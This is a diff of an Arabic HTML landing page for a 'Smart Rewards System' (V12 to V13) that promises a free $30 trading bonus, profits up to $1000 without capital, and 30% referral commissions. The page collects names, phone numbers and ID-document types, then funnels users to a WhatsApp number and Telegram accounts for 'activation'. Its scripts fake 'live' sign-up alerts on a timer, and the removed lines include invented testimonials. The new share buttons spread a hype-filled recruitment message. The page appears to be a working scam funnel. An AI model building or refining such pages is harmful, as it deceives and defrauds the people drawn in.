@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>نظام المكافآت الذكي | V12 PRO MAX</title>
+    <title>نظام المكافآت الذكي | V13 PRO</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -16,78 +16,62 @@
         .glass-card { background: var(--card); backdrop-filter: blur(10px); border: 1px solid var(--border); border-radius: 20px; padding: 25px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .section-title { color: var(--primary); font-size: 1.3rem; font-weight: 900; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
         
-        /* الرابط الثابت بعد التسجيل */
-        #persistent-ref { display: none; background: linear-gradient(135deg, rgba(34, 197, 94, 0.15), rgba(2, 6, 23, 0.9)); border: 2px solid var(--primary); padding: 20px; border-radius: 20px; margin-bottom: 20px; }
+        /* قسم المشاركة الجديد */
+        #persistent-ref { display: none; background: linear-gradient(135deg, rgba(34, 197, 94, 0.15), rgba(2, 6, 23, 0.9)); border: 2px solid var(--primary); padding: 20px; border-radius: 20px; }
         .ref-display { background: #0f172a; padding: 12px; border-radius: 10px; border: 1px dashed var(--primary); margin: 10px 0; font-family: monospace; font-size: 0.9rem; color: var(--primary); word-break: break-all; text-align: center; }
+        
+        .share-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
+        .share-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 10px; border-radius: 12px; font-size: 0.75rem; color: #fff; text-decoration: none; transition: 0.3s; background: rgba(255,255,255,0.05); border: 1px solid var(--border); }
+        .share-btn i { font-size: 1.5rem; margin-bottom: 5px; }
+        .share-btn:hover { background: var(--primary); transform: translateY(-3px); }
 
-        /* صناديق الشرح الاحترافية */
         .info-box { background: rgba(255,255,255,0.03); border-radius: 12px; padding: 15px; margin-bottom: 15px; border-right: 4px solid var(--primary); }
-        .info-box.gold { border-right-color: var(--gold); }
-        .info-box h4 { margin: 0 0 8px 0; font-size: 1.1rem; color: #fff; }
-        .info-box p { margin: 0; font-size: 0.9rem; color: #94a3b8; }
-
         .form-group { margin-bottom: 15px; }
         input, select { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid var(--border); background: #0f172a; color: #fff; font-family: 'Tajawal'; box-sizing: border-box; }
-        .btn-main { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; font-weight: 900; cursor: pointer; transition: 0.3s; }
+        .btn-main { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; font-weight: 900; cursor: pointer; }
+        .social-btn { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 14px; border-radius: 12px; text-decoration: none; color: #fff; font-weight: bold; margin-bottom: 10px; cursor: pointer; }
         
-        .social-btn { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 14px; border-radius: 12px; text-decoration: none; color: #fff; font-weight: bold; margin-bottom: 10px; font-size: 0.95rem; cursor: pointer; transition: 0.3s; }
-        .social-btn:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
-
-        /* إشعارات حية */
         #live-notify { position: fixed; bottom: 20px; left: 20px; background: var(--card); padding: 12px 20px; border-radius: 50px; border: 1px solid var(--primary); display: none; z-index: 9999; font-size: 0.85rem; font-weight: bold; animation: slideUp 0.5s ease-out; }
         @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-
         .iti { width: 100%; }
-        .iti__country-list { background-color: #0f172a !important; color: white !important; text-align: left; }
+        .iti__country-list { background-color: #0f172a !important; color: white !important; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div style="text-align:center; padding: 20px 0;">
-        <h1 style="font-weight:900; margin:0; font-size: 1.8rem;">نظام المكافآت الذكي <span style="color:var(--primary)">V12</span></h1>
-        <p style="color:#94a3b8;">تمويل حقيقي، أرباح ضخمة، ونظام إحالة عادل</p>
+        <h1 style="font-weight:900; margin:0; font-size: 1.8rem;">نظام المكافآت الذكي <span style="color:var(--primary)">V13</span></h1>
     </div>
 
     <div id="persistent-ref" class="glass-card">
-        <div class="section-title"><i class="fas fa-link"></i> رابط الإحالة الخاص بك</div>
-        <p style="font-size: 0.85rem; color: #cbd5e1;">هذا الرابط هو مفتاح أرباحك، شاركه مع أصدقائك الآن!</p>
+        <div class="section-title"><i class="fas fa-share-nodes"></i> انشر رابطك واربح 30%</div>
         <div class="ref-display" id="mainRefLink"></div>
-        <button class="btn-main" style="padding: 10px; font-size: 0.9rem;" onclick="copyLink()">نسخ الرابط <i class="fas fa-copy"></i></button>
-    </div>
-
-    <div class="glass-card">
-        <div class="section-title"><i class="fas fa-gift"></i> تفاصيل بونص الـ 30$</div>
-        <div class="info-box">
-            <h4>تمويل حقيقي 100%</h4>
-            <p>بمجرد تسجيلك، ستحصل على بونص 30$ للتداول. نحن نوفر لك رأس المال، وعليك فقط تحقيق الأرباح.</p>
-        </div>
-        <div class="info-box">
-            <h4>أرباح من 70$ إلى 1000$</h4>
-            <p>أرباح التداول بالبونص تبدأ من <b>70$ وتصل إلى 1000$</b>. الأرباح تُقسم بنسبة 50% لك و 50% للمنصة، والسحب متاح فور وصول حصتك لـ 20$.</p>
+        
+        <div class="share-grid">
+            <a href="#" onclick="shareTo('whatsapp')" class="share-btn" style="color:#25D366"><i class="fab fa-whatsapp"></i> واتساب</a>
+            <a href="#" onclick="shareTo('telegram')" class="share-btn" style="color:#0088cc"><i class="fab fa-telegram-plane"></i> تيليجرام</a>
+            <a href="#" onclick="shareTo('facebook')" class="share-btn" style="color:#1877F2"><i class="fab fa-facebook"></i> فيسبوك</a>
+            <a href="#" onclick="shareTo('twitter')" class="share-btn" style="color:#1DA1F2"><i class="fab fa-twitter"></i> تويتر</a>
+            <a href="#" onclick="shareTo('copy')" class="share-btn" style="color:var(--gold)"><i class="fas fa-copy"></i> نسخ الإعلان</a>
+            <a href="#" onclick="alert('قم بنسخ الإعلان وضعه في البايو الخاص بك على تيك توك/إنستا')" class="share-btn" style="color:#E1306C"><i class="fab fa-instagram"></i> إنستا/تيك توك</a>
         </div>
     </div>
 
     <div class="glass-card">
-        <div class="section-title" style="color:var(--gold)"><i class="fas fa-users-gear"></i> برنامج الشركاء (الإحالة)</div>
-        <div class="info-box gold">
-            <h4>عمولة 30% من الأرباح</h4>
-            <p>عندما يسجل صديقك عبر رابطك <b>ويكمل عملية التسجيل</b>، ستحصل أنت على حصة من أرباحه قدرها <b>30%</b>، والتي قد تتخطى 30$ وأكثر عن كل شخص!</p>
+        <div class="section-title"><i class="fas fa-gift"></i> بونص الـ 30$ والأرباح</div>
+        <div class="info-box">
+            <p>أرباح البونص من <b>70$ إلى 1000$</b>. الأرباح تُقسم 50/50، والسحب متاح عند وصول حصتك لـ 20$.</p>
         </div>
-        <div class="info-box gold">
-            <h4>شرط التفعيل للعمولة</h4>
-            <p>يجب على الصديق المدعو إكمال خطوات التسجيل والتواصل مع الإدارة لكي يتم احتساب العمولات وتفعيل حصتك من أرباحه.</p>
+        <div class="info-box" style="border-right-color: var(--gold)">
+            <p>اربح <b>30%</b> من أرباح أصدقائك المسجلين عبر رابطك. عمولات قد تتخطى 30$ للشخص!</p>
         </div>
     </div>
 
     <div id="registration-section" class="glass-card">
-        <div class="section-title"><i class="fas fa-id-card"></i> سجل بياناتك لتفعيل الحساب</div>
-        <div class="form-group">
-            <input type="text" id="name" placeholder="الاسم الكامل">
-        </div>
-        <div class="form-group">
-            <input type="tel" id="phone">
-        </div>
+        <div class="section-title"><i class="fas fa-user-plus"></i> افتح حسابك الآن</div>
+        <div class="form-group"><input type="text" id="name" placeholder="الاسم الكامل"></div>
+        <div class="form-group"><input type="tel" id="phone"></div>
         <div class="form-group">
             <select id="doc">
                 <option>البطاقة الشخصية</option>
@@ -95,29 +79,13 @@
                 <option>رخصة قيادة</option>
             </select>
         </div>
-        <button class="btn-main" onclick="register()">تفعيل النظام واستلام الرابط ✅</button>
+        <button class="btn-main" onclick="register()">تفعيل النظام ✅</button>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-star" style="color:var(--gold)"></i> آراء المتداولين</div>
-        <div id="reviews-list">
-            <div style="display: flex; gap: 15px; align-items: center; padding: 10px 0; border-bottom: 1px solid var(--border);">
-                <img src="https://randomuser.me/api/portraits/men/32.jpg" style="width:45px; border-radius:50%; border:2px solid var(--primary);">
-                <div><strong>ياسر العولقي</strong> <p style="font-size:0.8rem; margin:0; color:#94a3b8;">"حققت أرباح 150$ من البونص وسحبت حصتي بكل سهولة."</p></div>
-            </div>
-            <div style="display: flex; gap: 15px; align-items: center; padding: 10px 0;">
-                <img src="https://randomuser.me/api/portraits/women/44.jpg" style="width:45px; border-radius:50%; border:2px solid var(--primary);">
-                <div><strong>سماهر محمد</strong> <p style="font-size:0.8rem; margin:0; color:#94a3b8;">"نظام الإحالة قوي جداً، عمولاتي وصلت لـ 90$ في 3 أيام."</p></div>
-            </div>
-        </div>
-    </div>
-
-    <div class="glass-card">
-        <div class="section-title"><i class="fas fa-headset"></i> تواصل معنا للتفعيل</div>
-        <p style="font-size: 0.85rem; color: var(--gold); margin-bottom: 15px;">⚠️ ملاحظة: التواصل ضروري جداً لتفعيل بونص الـ 30$ وإدراجك في النظام.</p>
-        
+        <div class="section-title"><i class="fas fa-headset"></i> التواصل الرسمي</div>
         <div id="wa-btn" onclick="handleWhatsAppClick()" class="social-btn" style="background: #25D366;"><i class="fab fa-whatsapp"></i> تفعيل البونص (واتساب)</div>
-        <a href="https://t.me/A_VIP_B" class="social-btn" style="background: #0088cc;"><i class="fab fa-telegram-plane"></i> الدعم الفني (تيليجرام)</a>
+        <a href="https://t.me/A_VIP_B" class="social-btn" style="background: #0088cc;"><i class="fab fa-telegram-plane"></i> الدعم الفني</a>
         <a href="https://t.me/VIPA_BBOT" class="social-btn" style="background: #1e40af;"><i class="fas fa-robot"></i> بوت التواصل الآلي</a>
     </div>
 </div>
@@ -126,63 +94,49 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    // إعداد الهاتف واستثناء (مصر، المغرب، الجزائر، تونس، الأردن)
     const iti = window.intlTelInput(document.querySelector("#phone"), {
-        separateDialCode: true,
-        initialCountry: "ye",
-        excludeCountries: ["eg", "ma", "dz", "tn", "jo"], 
-        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
+        separateDialCode: true, initialCountry: "ye",
+        excludeCountries: ["eg", "ma", "dz", "tn", "jo"]
     });
 
-    // 1. منطق التسجيل
     function register() {
         const name = document.getElementById("name").value.trim();
-        const phone = iti.getNumber();
-        if(name.length < 5 || !iti.isValidNumber()) {
-            alert("يرجى إدخال بيانات صحيحة (الاسم الكامل ورقم هاتف صحيح)");
-            return;
-        }
-
-        const refCode = btoa(phone).substring(0, 8);
+        if(name.length < 5 || !iti.isValidNumber()) return alert("بيانات غير صحيحة");
+        
+        const refCode = btoa(iti.getNumber()).substring(0, 8);
         document.getElementById("mainRefLink").innerText = window.location.origin + "?ref=" + refCode;
         document.getElementById("persistent-ref").style.display = "block";
         document.getElementById("registration-section").style.display = "none";
-        
-        alert("تم التسجيل بنجاح! انسخ رابط الإحالة وتواصل معنا لتفعيل البونص.");
         window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
-    // 2. ميزة الرسالة المشروطة (الشرط الذكي)
-    function handleWhatsAppClick() {
-        const isRegistered = document.getElementById("registration-section").style.display === "none";
-        
-        if (isRegistered) {
-            // حالة المستخدم المسجل
-            const name = document.getElementById("name").value;
-            const phone = iti.getNumber();
-            const doc = document.getElementById("doc").value;
-            const link = document.getElementById("mainRefLink").innerText;
-            const country = iti.getSelectedCountryData().name;
+    // ميزة المشاركة الذكية
+    function shareTo(platform) {
+        const myLink = document.getElementById("mainRefLink").innerText;
+        const promoText = `🔥 فرصة ذهبية! احصل على بونص تداول 30$ مجاناً وابدأ بجني أرباح تصل إلى 1000$ بدون رأس مال! 💸 سجل الآن عبر رابطي وابدأ رحلتك:\n🔗 ${myLink}\n\n#تداول #اربح #مجانا`;
 
-            const msg = encodeURIComponent(`أهلاً إدارة نظام المكافآت،\nلقد أتممت التسجيل ببياناتي:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🌍 الدولة: ${country}\n📄 الوثيقة: ${doc}\n🔗 رابط إحالتي: ${link}\n\nأريد تفعيل بونص الـ 30$ وبدء العمل.`);
-            window.open(`https://wa.me/967739399064?text=${msg}`, '_blank');
-        } else {
-            // حالة المستخدم غير المسجل (نص استفسار)
-            const guestMsg = encodeURIComponent(`مرحباً إدارة المكافآت،\nدخلت للموقع وأريد الاستفسار عن كيفية الحصول على بونص 30$ ونظام أرباح الإحالة. ما هي الخطوات؟`);
-            window.open(`https://wa.me/967739399064?text=${guestMsg}`, '_blank');
+        switch(platform) {
+            case 'whatsapp': window.open(`https://wa.me/?text=${encodeURIComponent(promoText)}`); break;
+            case 'telegram': window.open(`https://t.me/share/url?url=${encodeURIComponent(myLink)}&text=${encodeURIComponent(promoText)}`); break;
+            case 'facebook': window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(myLink)}`); break;
+            case 'twitter': window.open(`https://twitter.com/intent/tweet?text=${encodeURIComponent(promoText)}`); break;
+            case 'copy': 
+                navigator.clipboard.writeText(promoText);
+                alert("تم نسخ النص الترويجي مع رابطك! يمكنك الآن لصقه في أي مكان.");
+                break;
         }
     }
 
-    function copyLink() {
-        navigator.clipboard.writeText(document.getElementById("mainRefLink").innerText);
-        alert("تم النسخ!");
+    function handleWhatsAppClick() {
+        const isRegistered = document.getElementById("registration-section").style.display === "none";
+        const msg = isRegistered ? `أتممت التسجيل ببياناتي وأريد تفعيل البونص..` : `أريد الاستفسار عن بونص الـ 30$..`;
+        window.open(`https://wa.me/967739399064?text=${encodeURIComponent(msg)}`, '_blank');
     }
 
-    // 3. الإشعارات الحية
-    const users = ["صالح", "خالد", "هدى", "عبدالله", "إبراهيم", "فاطمة", "سعيد"];
+    // إشعارات حية
     setInterval(() => {
         const n = document.getElementById("live-notify");
-        n.innerHTML = `<i class="fas fa-check-circle" style="color:var(--primary)"></i> سجل الآن ${users[Math.floor(Math.random()*users.length)]} وحجز مكافأة الـ 30$!`;
+        n.innerHTML = `<i class="fas fa-check-circle" style="color:var(--primary)"></i> انضم مستخدم جديد وحجز مكافأته!`;
         n.style.display = "block";
         setTimeout(() => n.style.display = "none", 4000);
     }, 15000);
